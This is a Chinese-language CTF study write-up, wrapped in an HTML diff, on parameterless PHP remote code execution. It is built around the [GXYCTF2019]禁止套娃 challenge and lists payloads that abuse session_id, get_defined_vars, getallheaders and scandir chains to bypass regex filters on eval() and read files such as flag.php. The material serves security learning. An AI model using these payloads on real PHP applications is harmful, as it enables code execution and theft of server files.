@@ -1,0 +1,131 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="3fe5255165e2d5eba4e1c0d78682736d">0x00前言</h1>
+<p>刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。<br/>
+<strong>实例</strong></p>
+<pre><code>if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) { 
+eval($_GET['code']);
+}
+preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)
+pre_match('/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i', $code))</code></pre>
+<p><strong>解析</strong></p>
+<pre><code>preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。
+再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）
+
+preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</code></pre>
+<p>说白了就是传入的参数不能含有参数</p>
+<pre><code>scandir（'a()'）//可以使用，里面没有参数
+scandir（'123'）//不可以使用，里面有参数</code></pre>
+<p>所谓无参数<code>RCE</code>说白了就是使用一个个的函数来达到我们的目的。<br/>
+例如<code>print_r(array_reverse(scandir(current(localeconv()))))</code><br/>
+接下来就说说由哪些方法能完成RCE<br/>
+<strong>测试代码</strong></p>
+<pre><code>&lt;?php
+if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
+    eval($_GET['code']);
+}</code></pre>
+<h1 data-content="1" id="c89a582c44ae860458585080380f12ba">0x01关于无参数RCE的一些方法</h1>
+<h2 data-content="1" id="fe90abd0090d385008000780ea33c998">方法一 利用session_id</h2>
+<p>利用<code>http headers</code>传参，然而<code>http</code>中有那么多的内容，最容易想到的估计就是<code>cookies</code>传递参数。<br/>
+在php中有一个函数<code>session_id</code>可以用来获取/设置当前会话ID，并且这个值是我们可控的。但是它的使用有些限制： 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 ，但是这并不影响我们操作。我们可以使用十六进制传入，之后使用<code>hex2bin()</code>函数转换即可。但是使用<code>session_id</code>的时候必须要开启<code>session</code>才可以，需要<code>session_start</code><br/>
+构造payload</p>
+<pre><code>?code=eval(hex2bin(session_id(session_start())));</code></pre>
+<p><code>hex("phpinfo();")=706870696e666f28293b</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160241-7a8400c8-0d56-1.png"/></p>
+<h2 data-content="1" id="fb38596ed2e216ad78dd97c7216f74f3">方法二 利用get_defined_vars ()函数</h2>
+<p><code>get_defined_vars()：返回由所有已定义变量所组成的数组</code></p>
+<p>我们通过<code>get</code>或者<code>post</code>方法，传入的参数，以及它的值可以被<code>get_defined_vars()</code>读出来。而且它返回的还是数组，那么我们可以通过php中的一系列对数组操作的函数来得到我们想要的值</p>
+<pre><code>end() - 将内部指针指向数组中的最后一个元素，并输出。
+next() - 将内部指针指向数组中的下一个元素，并输出。
+prev() - 将内部指针指向数组中的上一个元素，并输出。
+reset() - 将内部指针指向数组中的第一个元素，并输出。
+each() - 返回当前元素的键名和键值，并将内部指针向前移动。
+current() -输出数组中的当前元素的值。</code></pre>
+<p>构造payload</p>
+<pre><code>?code=print_r(current(get_defined_vars()));&amp;b=phpinfo();</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160317-903a48fa-0d56-1.png"/></p>
+<p>查看最后一个数组，且eval</p>
+<pre><code>?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160341-9e2dea48-0d56-1.png"/></p>
+<h2 data-content="1" id="7ff59897835c97270088e13662eacaeb">方法三 利用getallheaders()</h2>
+<p><code>getallheaders返回当前请求的所有请求头信息</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160401-aa6f63ae-0d56-1.png"/></p>
+<p>尝试写入phpinfo（）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160417-b372971e-0d56-1.png"/></p>
+<p>之后就可用数组操作的函数拿出phpinfo（）且执行。<br/>
+构造payload</p>
+<pre><code>?code=eval(next(getallheaders()));</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160439-c0daddee-0d56-1.png"/></p>
+<h2 data-content="1" id="248bbec139b31e0f0350be8a8f99700f">方法四 getenv()</h2>
+<p><code>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)</code><br/>
+看简介就明白，它并不适用于PHP&lt;7.1的版本，我的版本不合适，报了400错误，往里面传参也不行。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160511-d3a0ccae-0d56-1.png"/></p>
+<p>没有成功，好在这种方法使用限制比较多，使用也相对比较少。</p>
+<h2 data-content="1" id="253bea7a8135dc47a377a64a904a871c">方法五 scandir()</h2>
+<p>这种方法是使用比较多的，相对而言比较多变，各个函数相辅相成。</p>
+<pre><code>scandir()  //函数返回指定目录中的文件和目录的数组。
+localeconv()   //返回一包含本地数字及货币格式信息的数组。
+current()     //返回数组中的单元，默认取第一个值。
+pos是current的别名
+getcwd()      //取得当前工作目录
+dirname()     //函数返回路径中的目录部分。
+array_flip()  //交换数组中的键和值，成功时返回交换后的数组
+array_rand()  //从数组中随机取出一个或多个单元
+array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
+dirname(chdir(dirname()))配合切换文件路径</code></pre>
+<p><strong>示例</strong></p>
+<pre><code>print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
+print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
+show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
+print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件
+if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件</code></pre>
+<p>由此可以看出各个函数相互利用，组合方法有很多</p>
+<h1 data-content="1" id="bf98e4dad8b6815f17cd38ca1b60fa3a">实例</h1>
+<p>知识不经过组合利用就不会起作用</p>
+<h2 data-content="1" id="153389fd9f08da2ef86353c399af1dce">[GXYCTF2019]禁止套娃</h2>
+<p>dirsearch扫目录得<code>/.git</code> 利用githack得源码</p>
+<pre><code>&lt;?php
+include "flag.php";
+echo "flag在哪里呢？&lt;br&gt;";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?&gt;</code></pre>
+<p>查看代码，很明显的无参数RCE<br/>
+其中<code>(?R)</code>引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br/>
+<code>scandir('.')</code>返回当前目录，但是如何构造<code>.</code> 函数<code>localeconv()</code> 返回一包含本地数字及货币格式信息的数组。   但是其数组第一项就是<code>.</code>， <code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。<br/>
+构造payload</p>
+<pre><code>?exp=print_r(scandir(pos(localeconv())));</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160612-f84c9894-0d56-1.png"/></p>
+<p>利用对数组操作的函数读取flag<br/>
+ 利用<code>array_reverse()</code> 将数组内容反转一下  ， 利用<code>next()</code>指向第二个元素，也就是flag.php</p>
+<pre><code>?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210904160633-050af3f0-0d57-1.png"/></p>
+<h1 data-content="1" id="90276e64bdd3327a8df22470b61aca0b">0x02 后记</h1>
+<p>在没学习之前觉得这个知识点可能会很难，现在倒也觉得没有我想的那么难。有些东西做了才知道深浅。继续加油吧。</p>
+<p><strong>参考</strong><br/>
+<a href="https://blog.csdn.net/qq_38154820/article/details/107171940" target="_blank">https://blog.csdn.net/qq_38154820/article/details/107171940</a><br/>
+<a href="https://blog.csdn.net/qq_45570082/article/details/106602261" target="_blank">https://blog.csdn.net/qq_45570082/article/details/106602261</a><br/>
+<a href="https://xz.aliyun.com/t/9360#toc-6" target="_blank">https://xz.aliyun.com/t/9360#toc-6</a></p>
+</div>
+</div>
